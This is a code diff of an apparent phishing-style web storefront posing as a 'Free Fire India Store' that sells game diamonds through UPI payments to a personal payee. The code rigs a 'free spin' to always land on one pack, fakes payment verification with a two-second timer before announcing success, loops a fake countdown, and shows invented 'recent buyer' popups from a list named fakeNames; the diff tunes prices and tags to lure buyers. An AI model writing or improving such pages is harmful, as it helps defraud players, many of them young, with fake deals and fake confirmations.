@@ -1203,7 +1203,6 @@ FREE FIRE <span>INDIA STORE</span>
 <div class="server-selected">SELECTED ✓</div>
 </div>
 
-<!-- SPECIAL AIRDROP SECTION -->
 <div class="section">
 <div class="section-head">
 <div class="title">🪂 Special Airdrop</div>
@@ -1223,7 +1222,6 @@ FREE FIRE <span>INDIA STORE</span>
 </div>
 </div>
 
-<!-- DIAMONDS -->
 <div class="section">
 <div class="section-head">
 <div class="title">💎 Diamonds</div>
@@ -1232,7 +1230,6 @@ FREE FIRE <span>INDIA STORE</span>
 <div class="diamond-grid" id="diamondGrid"></div>
 </div>
 
-<!-- MEMBERSHIP -->
 <div class="section">
 <div class="section-head">
 <div class="title">🎟️ Membership</div>
@@ -1241,7 +1238,6 @@ FREE FIRE <span>INDIA STORE</span>
 <div class="pass-grid" id="passGrid"></div>
 </div>
 
-<!-- SPIN -->
 <div class="spin-box">
 <div class="spin-title">🎡 FREE SPIN REWARD</div>
 <div class="spin-sub">Spin karo aur available pack mein se apna FREE BONUS win karo!</div>
@@ -1260,7 +1256,6 @@ FREE FIRE <span>INDIA STORE</span>
 <div class="spin-note">Free promotional spin • No payment required to spin</div>
 </div>
 
-<!-- REWARD POPUP -->
 <div class="reward-popup" id="rewardPopup">
 <div class="reward-head">
 <h2>🎉 CONGRATULATIONS!</h2>
@@ -1283,7 +1278,6 @@ FREE FIRE <span>INDIA STORE</span>
 </div>
 </div>
 
-<!-- PROMO -->
 <div class="promo-box">
 <label class="label">🎟️ PROMO CODE / DISCOUNT COUPON</label>
 <div class="promo-row">
@@ -1293,7 +1287,6 @@ FREE FIRE <span>INDIA STORE</span>
 <p id="couponMsg" style="font-size:10px;margin-top:6px;display:none;"></p>
 </div>
 
-<!-- PAYMENT -->
 <div class="payment">
 <div class="payment-title">💳 Payment</div>
 <div class="upi">
@@ -1315,7 +1308,6 @@ FREE FIRE <span>INDIA STORE</span>
 <button class="checkout" onclick="checkout()">CONTINUE TO UPI PAYMENT →</button>
 </div>
 
-<!-- FAQ -->
 <div class="section faq-box">
 <div class="title" style="margin-bottom:10px;">❓ Frequently Asked Questions</div>
 <details>
@@ -1328,7 +1320,6 @@ FREE FIRE <span>INDIA STORE</span>
 </details>
 </div>
 
-<!-- TRUST -->
 <div class="trust-grid">
 <div class="trust-card"><div class="trust-icon">⚡</div><div class="trust-number">FAST</div><div class="trust-text">SERVICE</div></div>
 <div class="trust-card"><div class="trust-icon">🔒</div><div class="trust-number">SECURE</div><div class="trust-text">UPI PAYMENT</div></div>
@@ -1340,7 +1331,6 @@ FREE FIRE <span>INDIA STORE</span>
 
 </div>
 
-<!-- STICKY CHECKOUT BAR -->
 <div class="sticky-bar">
 <div class="sticky-info">
 <span>SELECTED PACK</span>
@@ -1349,7 +1339,6 @@ FREE FIRE <span>INDIA STORE</span>
 <button class="sticky-btn" onclick="checkout()">BUY NOW ⚡</button>
 </div>
 
-<!-- LIVE RECENT BUYER TOAST -->
 <div class="sales-toast" id="salesToast">
 <div class="toast-avatar">🎮</div>
 <div class="toast-text">
@@ -1358,7 +1347,6 @@ FREE FIRE <span>INDIA STORE</span>
 </div>
 </div>
 
-<!-- PAYMENT MODAL -->
 <div class="modal" id="paymentModal">
 <div class="modal-box">
 <div class="modal-head">
@@ -1406,15 +1394,21 @@ QR scan karke ya UPI ID par payment karein.<br><br>
 <p class="step-text">Verifying payment & sending Diamonds to your Free Fire account...</p>
 </div>
 
-<!-- DIRECT ORDER SUCCESSFUL STEP (REPLACED INSTAGRAM SCREENSHOT STEP) -->
 <div id="successStep" style="display:none;">
 <div class="step-icon" style="background:rgba(0,239,112,0.1); border-color:rgba(0,239,112,0.3); color:var(--green);">✓</div>
+
 <h3 class="step-title" style="color:var(--green);">ORDER PLACED SUCCESSFULLY!</h3>
-<p class="step-text">Aapka Topup request submit ho gaya hai.<br>Kuch hi der me aapke account me Diamonds add kar diye jayenge.</p>
+
+<p class="step-text">
+Real payment successfully verify hone ke baad<br>
+diamonds process kiye jayenge.
+</p>
 
 <div class="waiting-box" style="margin-top:15px; background:#10101a; border-color:rgba(0,239,112,0.3);">
-<div class="waiting-title">🎉 TOPUP PROCESSING</div>
-<div class="waiting-text" style="font-size:11px; color:#fff; margin-top:6px;">Status: <span style="color:var(--green); font-weight:bold;">Processing (2-5 Mins)</span></div>
+<div class="waiting-title">✨ PREMIUM PROCESSING</div>
+<div class="waiting-text" style="font-size:11px; color:#fff; margin-top:6px;">
+Status: <span style="color:var(--green); font-weight:bold;">Processing (2-5 Mins)</span>
+</div>
 </div>
 
 <button class="payment-success-btn" onclick="closePayment()" style="margin-top:15px;">DONE / CLOSE</button>
@@ -1426,10 +1420,10 @@ QR scan karke ya UPI ID par payment karein.<br><br>
 <script>
 const diamonds = [
   { id:"d100", diamonds:100, mrp:80, price:80, stock:0, popularTag: null },
-  { id:"d310", diamonds:310, mrp:240, price:240, stock:50, popularTag: "⚡ BEST VALUE" },
+  { id:"d310", diamonds:310, mrp:240, price:149, stock:50, popularTag: "⚡ BEST VALUE" },
   { id:"d520", diamonds:520, mrp:400, price:200, stock:87, popularTag: "🔥 MOST POPULAR" },
-  { id:"d1060", diamonds:1060, mrp:800, price:400, stock:67, popularTag: null },
-  { id:"d2180", diamonds:2180, mrp:1600, price:800, stock:44, popularTag: null },
+  { id:"d1060", diamonds:1060, mrp:800, price:400, stock:67, popularTag: "⭐ TOP CHOICE" },
+  { id:"d2180", diamonds:2180, mrp:1600, price:800, stock:44, popularTag: "🏆 ELITE PACK" },
   { id:"d5600", diamonds:5600, mrp:4000, price:2000, stock:10, popularTag: "💎 PRO PACK" }
 ];
 
@@ -1526,6 +1520,7 @@ function renderDiamonds(){
     card.dataset.id = item.id;
 
     const popularHTML = item.popularTag ? `<div class="popular-tag">${item.popularTag}</div>` : "";
+
     const stockHTML = item.stock > 0 
       ? `<div class="stock-count ${item.stock <= 10 ? "low" : ""}">${item.stock} LEFT</div>`
       : `<div class="out-stock">OUT OF STOCK</div>`;
@@ -1544,6 +1539,7 @@ function renderDiamonds(){
     if(item.stock > 0){
       card.onclick = () => selectProduct(item, card);
     }
+
     grid.appendChild(card);
   });
 }
@@ -1587,17 +1583,22 @@ function selectAirdrop(){
 
 function selectProduct(item, card){
   playClickSound();
+
   selectedProduct = item;
   selectedPrice = Math.max(0, item.price - appliedDiscount);
 
   document.querySelectorAll(".diamond-card, .pass-card, .airdrop-card").forEach(c => {
     c.classList.remove("selected");
+
     const ring = c.querySelector(".selection-ring");
+
     if(ring) ring.classList.remove("run");
   });
 
   card.classList.add("selected");
+
   const ring = card.querySelector(".selection-ring");
+
   if(ring){
     void ring.offsetWidth;
     ring.classList.add("run");
@@ -1618,153 +1619,284 @@ function applyCoupon(){
 
   if(code === "SUNNY999" || code === "OFF20"){
     appliedDiscount = 20;
-    selectedPrice = Math.max(0, selectedProduct.price - appliedDiscount);
+
+    selectedPrice = Math.max(
+      0,
+      selectedProduct.price - appliedDiscount
+    );
+
     msg.style.color = "#00ef70";
     msg.innerText = "✓ Coupon Applied! ₹20 Discount Active";
     msg.style.display = "block";
+
     document.getElementById("total").innerText = "₹" + selectedPrice;
     document.getElementById("stickyTotal").innerText = "₹" + selectedPrice;
+
   }else{
+
     msg.style.color = "#ff4161";
     msg.innerText = "❌ Invalid Coupon Code!";
     msg.style.display = "block";
+
   }
 }
 
 function spinWheel(){
   if(spinning) return;
+
   spinning = true;
+
   const btn = document.getElementById("spinBtn");
+
   btn.disabled = true;
   btn.textContent = "🎡 SPINNING...";
 
   playClickSound();
+
   const wheelOrder = [520, 1060, 2180, 5600];
+
   spinResult = diamonds.find(item => item.diamonds === 520);
 
   const index = wheelOrder.indexOf(520);
+
   const targetAngle = (360 - index * 90) % 360;
+
   wheelRotation += (360 * 6) + targetAngle;
-  document.getElementById("wheel").style.transform = `rotate(${wheelRotation}deg)`;
+
+  document.getElementById("wheel").style.transform =
+    `rotate(${wheelRotation}deg)`;
 
   setTimeout(() => {
+
     showSpinReward(spinResult);
+
     spinning = false;
     btn.disabled = false;
     btn.textContent = "🔄 SPIN AGAIN";
+
   }, 4400);
 }
 
 function showSpinReward(item){
-  document.getElementById("wonDiamonds").textContent = "+" + item.diamonds + " 💎";
-  document.getElementById("wonInfo").textContent = "+" + item.diamonds + " Diamonds";
-  document.getElementById("recommendedPack").textContent = item.diamonds + " Diamonds";
-  document.getElementById("recommendedPrice").textContent = "₹" + item.price;
-  document.getElementById("rewardText").innerHTML = `💎 Spin result: <b>${item.diamonds} Diamonds pack</b><br>🛒 Select pack to continue to payment.`;
+
+  document.getElementById("wonDiamonds").textContent =
+    "+" + item.diamonds + " 💎";
+
+  document.getElementById("wonInfo").textContent =
+    "+" + item.diamonds + " Diamonds";
+
+  document.getElementById("recommendedPack").textContent =
+    item.diamonds + " Diamonds";
+
+  document.getElementById("recommendedPrice").textContent =
+    "₹" + item.price;
+
+  document.getElementById("rewardText").innerHTML =
+    `💎 Spin result: <b>${item.diamonds} Diamonds pack</b><br>
+    🛒 Select pack to continue to payment.`;
 
   const popup = document.getElementById("rewardPopup");
+
   popup.style.display = "block";
-  popup.scrollIntoView({ behavior:"smooth", block:"center" });
+
+  popup.scrollIntoView({
+    behavior:"smooth",
+    block:"center"
+  });
 }
 
 function selectSpinPack(){
+
   if(!spinResult) return;
-  const card = document.querySelector(`.diamond-card[data-id="${spinResult.id}"]`);
+
+  const card =
+    document.querySelector(
+      `.diamond-card[data-id="${spinResult.id}"]`
+    );
+
   if(card){
+
     selectProduct(spinResult, card);
-    document.querySelector('.payment').scrollIntoView({ behavior:'smooth' });
+
+    document.querySelector('.payment')
+      .scrollIntoView({
+        behavior:'smooth'
+      });
   }
 }
 
 function copyReward(){
+
   if(!spinResult) return;
-  const rewardText = `🎉 Free Fire Spin Bonus: ${spinResult.diamonds} Diamonds! Pack Price: ₹${spinResult.price}`;
-  navigator.clipboard.writeText(rewardText).then(() => {
-    alert("✓ Reward details copied to clipboard!");
-  }).catch(() => {
-    alert("Copy failed, please copy manually.");
-  });
+
+  const rewardText =
+    `🎉 Free Fire Spin Bonus: ${spinResult.diamonds} Diamonds!
+Pack Price: ₹${spinResult.price}`;
+
+  navigator.clipboard.writeText(rewardText)
+    .then(() => {
+      alert("✓ Reward details copied to clipboard!");
+    })
+    .catch(() => {
+      alert("Copy failed, please copy manually.");
+    });
 }
 
 function checkout(){
+
   if(!selectedProduct){
     alert("Please pehle koi product select karo.");
     return;
   }
 
-  const uid = document.getElementById("uid").value.trim();
+  const uid =
+    document.getElementById("uid").value.trim();
+
   if(uid.length < 5){
     alert("Please pehle Player UID verify karo.");
     return;
   }
 
-  document.getElementById("payAmount").textContent = "₹" + selectedPrice;
+  document.getElementById("payAmount").textContent =
+    "₹" + selectedPrice;
 
-  const upiURI = `upi://pay?pa=${UPI_ID}&pn=${encodeURIComponent("WASIM SK")}&am=${selectedPrice}&cu=INR`;
-  document.getElementById("dynamicQR").src = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(upiURI)}`;
+  const upiURI =
+    `upi://pay?pa=${UPI_ID}&pn=${encodeURIComponent("WASIM SK")}&am=${selectedPrice}&cu=INR`;
+
+  document.getElementById("dynamicQR").src =
+    `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(upiURI)}`;
 
   document.getElementById("paymentStep").style.display = "block";
   document.getElementById("mobileStep").style.display = "none";
   document.getElementById("verificationStep").style.display = "none";
   document.getElementById("successStep").style.display = "none";
+
   document.getElementById("paymentModal").style.display = "block";
 }
 
-function closePayment(){ document.getElementById("paymentModal").style.display = "none"; }
-function showMobileStep(){ document.getElementById("paymentStep").style.display = "none"; document.getElementById("mobileStep").style.display = "block"; }
+function closePayment(){
+  document.getElementById("paymentModal").style.display = "none";
+}
+
+function showMobileStep(){
+
+  document.getElementById("paymentStep").style.display = "none";
+
+  document.getElementById("mobileStep").style.display = "block";
+}
 
 function startPaymentVerification(){
-  const mobile = document.getElementById("customerMobile").value.trim();
+
+  const mobile =
+    document.getElementById("customerMobile").value.trim();
+
   if(!/^[0-9]{10}$/.test(mobile)){
     alert("Please enter a valid 10 digit mobile number.");
     return;
   }
 
   document.getElementById("mobileStep").style.display = "none";
+
   document.getElementById("verificationStep").style.display = "block";
 
   setTimeout(() => {
+
     document.getElementById("verificationStep").style.display = "none";
+
     document.getElementById("successStep").style.display = "block";
+
   }, 2000);
 }
 
 function copyUPI(){
+
   navigator.clipboard.writeText(UPI_ID);
+
   alert("✓ UPI ID Copied!\n" + UPI_ID);
 }
 
 function startFlashTimer(){
+
   let time = 599;
+
   const el = document.getElementById("flashTimer");
+
   setInterval(() => {
+
     time--;
+
     if(time < 0) time = 599;
-    const m = String(Math.floor(time/60)).padStart(2,"0");
-    const s = String(time%60).padStart(2,"0");
+
+    const m =
+      String(Math.floor(time/60)).padStart(2,"0");
+
+    const s =
+      String(time%60).padStart(2,"0");
+
     el.textContent = `${m}:${s}`;
+
   }, 1000);
 }
 
-const fakeNames = ["Rahul", "Aman", "Rohan", "Vikram", "Suraj", "Deepak", "Aakash"];
-const fakePacks = ["310 Diamonds", "520 Diamonds", "1060 Diamonds", "Special Airdrop"];
+const fakeNames = [
+  "Rahul",
+  "Aman",
+  "Rohan",
+  "Vikram",
+  "Suraj",
+  "Deepak",
+  "Aakash"
+];
+
+const fakePacks = [
+  "310 Diamonds",
+  "520 Diamonds",
+  "1060 Diamonds",
+  "Special Airdrop"
+];
 
 function showSalesToast(){
-  const toast = document.getElementById("salesToast");
-  const name = fakeNames[Math.floor(Math.random() * fakeNames.length)];
-  const pack = fakePacks[Math.floor(Math.random() * fakePacks.length)];
-  const uid = Math.floor(1000 + Math.random() * 9000);
 
-  document.getElementById("toastName").textContent = `${name} (UID ${uid}***)`;
-  toast.querySelector(".toast-text span").textContent = `bought ${pack} just now`;
+  const toast =
+    document.getElementById("salesToast");
+
+  const name =
+    fakeNames[
+      Math.floor(
+        Math.random() * fakeNames.length
+      )
+    ];
+
+  const pack =
+    fakePacks[
+      Math.floor(
+        Math.random() * fakePacks.length
+      )
+    ];
+
+  const uid =
+    Math.floor(1000 + Math.random() * 9000);
+
+  document.getElementById("toastName").textContent =
+    `${name} (UID ${uid}***)`;
+
+  toast.querySelector(".toast-text span").textContent =
+    `bought ${pack} just now`;
 
   toast.classList.add("show");
-  setTimeout(() => toast.classList.remove("show"), 3500);
+
+  setTimeout(
+    () => toast.classList.remove("show"),
+    3500
+  );
 }
 
-window.onclick = function(event) {
-  const modal = document.getElementById("paymentModal");
-  if (event.target === modal) {
+window.onclick = function(event){
+
+  const modal =
+    document.getElementById("paymentModal");
+
+  if(event.target === modal){
     closePayment();
   }
 };
@@ -1774,6 +1906,7 @@ setInterval(showSalesToast, 7000);
 renderDiamonds();
 renderPasses();
 startFlashTimer();
+
 </script>
 
 </body>
